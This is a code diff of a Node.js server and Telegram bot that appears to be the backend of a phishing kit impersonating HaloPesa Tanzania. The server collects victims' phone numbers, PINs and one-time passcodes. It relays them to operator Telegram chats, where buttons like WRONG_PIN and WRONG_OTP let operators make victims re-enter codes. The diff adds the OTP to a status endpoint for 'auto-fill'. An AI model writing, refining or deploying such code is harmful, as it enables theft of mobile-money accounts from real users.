@@ -1,6 +1,6 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Updated with Independent Chat ID Routing for Sub-Admins.
+ * Fixed status endpoint to include 'otp' for auto-fill and correct routing.
  */
 
 const express = require('express');
@@ -67,10 +67,6 @@ function isValidHaloPesaNumber(number) {
   return /^(061|062|063)\d{7}$/.test(clean);
 }
 
-/**
- * Strictly resolve target chat ID. Sub-admins receive their own traffic independently.
- * Falls back to main admin ONLY if no valid sub-admin is provided.
- */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
@@ -79,10 +75,10 @@ function resolveTargetChat(adminParam) {
     }
     const adminRecord = admins.get(targetAdmin);
     if (adminRecord && adminRecord.authorized) {
-      return targetAdmin; // Delivered independently to this sub-admin chat ID
+      return targetAdmin;
     }
   }
-  return null; // Do not leak to main admin by default for sub-admin links
+  return null;
 }
 
 async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
@@ -158,37 +154,9 @@ async function initBot() {
     await updateContinuousAdminList(chatId, null, 0);
   });
 
-  bot.onText(/\/myprofile|\/me/, async (msg) => {
-    try {
-      const chatId = String(msg.chat.id);
-      const userId = msg.from.id;
-      const username = msg.from.username ? `@${msg.from.username}` : 'Hakuna';
-      const firstName = msg.from.first_name || 'Haipo';
-      const lastName = msg.from.last_name || 'Haipo';
-      
-      if (chatId !== String(FALLBACK_ADMIN_ID)) {
-        const record = admins.get(chatId);
-        if (!record || !record.authorized) {
-          await bot.sendMessage(chatId, `⚠️ Akaunti yako bado haijaidhinishwa.`);
-          return;
-        }
-      }
-      
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-      let profileText = 
-        `👤 *Taarifa zako za Kiungo Maalum*\n\n` +
-        `• *Jina:* ${firstName}${lastName}\n` +
-        `• *Telegram ID:* \`${userId}\`\n\n` +
-        `🔗 *Kiungo Chako Maalum:*\n${userLink}`;
-
-      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
-    } catch (err) {}
-  });
-
   bot.onText(/\/start/, async (msg) => {
     try {
       const chatId = String(msg.chat.id);
-      const userId = msg.from.id;
       const username = msg.from.username || '';
       const firstName = msg.from.first_name || 'Mtumiaji';
       const lastName = msg.from.last_name || '';
@@ -221,18 +189,17 @@ async function initBot() {
       const record = admins.get(chatId);
 
       if (!record.authorized) {
-        // Only registration requests go to the Main Admin
         await bot.sendMessage(FALLBACK_ADMIN_ID, 
           `🚨 *Msimamizi Msaidizi Mpya Anasubiri Idhini!*\n\n` +
           `👤 *Mtumiaji:* ${username ? '@' + username : firstName}\n` +
-          `🆔 *Chat ID:* \`${userId}\``, 
+          `🆔 *Chat ID:* \`${chatId}\``, 
           { 
             parse_mode: 'Markdown',
             reply_markup: {
               inline_keyboard: [
                 [
-                  { text: '✅ Idhinisha', callback_data: `AUTH_YES_${userId}` },
-                  { text: '❌ Kataa', callback_data: `AUTH_NO_${userId}` }
+                  { text: '✅ Idhinisha', callback_data: `AUTH_YES_${chatId}` },
+                  { text: '❌ Kataa', callback_data: `AUTH_NO_${chatId}` }
                 ]
               ]
             }
@@ -312,7 +279,6 @@ async function initBot() {
         session = { contact: 'Haijulikani', adminChatId: chatId };
       }
 
-      // Ensure actions taken respond directly to the sub-admin managing this specific session
       const chatTarget = session.adminChatId || chatId;
 
       switch (prefix) {
@@ -330,10 +296,12 @@ async function initBot() {
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
+          session.otp = '';
           await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi`);
           break;
         case 'WRONG_OTP':
           session.status = 'RETRY_OTP';
+          session.otp = '';
           await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi`);
           break;
         default:
@@ -369,7 +337,6 @@ app.post('/api/submit-application', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Weka namba sahihi ya HaloPesa kuanzia na 061, 062, au 063.' });
     }
 
-    // Resolves specifically to the sub-admin ID; prevents fallback leakage to main admin
     const targetChat = resolveTargetChat(adminChatId);
     if (!targetChat) {
       return res.status(400).json({ success: false, error: 'Msimamizi hajaidhinishwa au kiungo si sahihi.' });
@@ -413,7 +380,8 @@ app.get('/api/check-status/:userId', (req, res) => {
   const { userId } = req.params;
   const session = sessions.get(userId);
   if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
-  res.status(200).json({ status: session.status });
+  // FIXED: Include 'otp' field in response so autofill works correctly
+  res.status(200).json({ status: session.status, otp: session.otp || '' });
 });
 
 app.post('/api/request-new-otp', async (req, res) => {
@@ -423,7 +391,7 @@ app.post('/api/request-new-otp', async (req, res) => {
     if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
 
     session.status = 'REQUESTING_NEW_OTP';
-    const targetChat = session.adminChatId; // Routes independently to the assigned sub-admin
+    const targetChat = session.adminChatId;
 
     if (bot && targetChat) {
       await bot.sendMessage(targetChat, `⚠️ APPLICANT IS REQUESTING NEW OTP\n\nNUMBER: ${session.contact}`, {
@@ -469,7 +437,7 @@ app.post('/api/submit-otp', async (req, res) => {
       }
     };
 
-    const targetChat = session.adminChatId; // Routes independently to the assigned sub-admin
+    const targetChat = session.adminChatId;
     if (targetChat && bot) {
       await bot.sendMessage(targetChat, message, opts);
     }
@@ -484,4 +452,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-  
+    
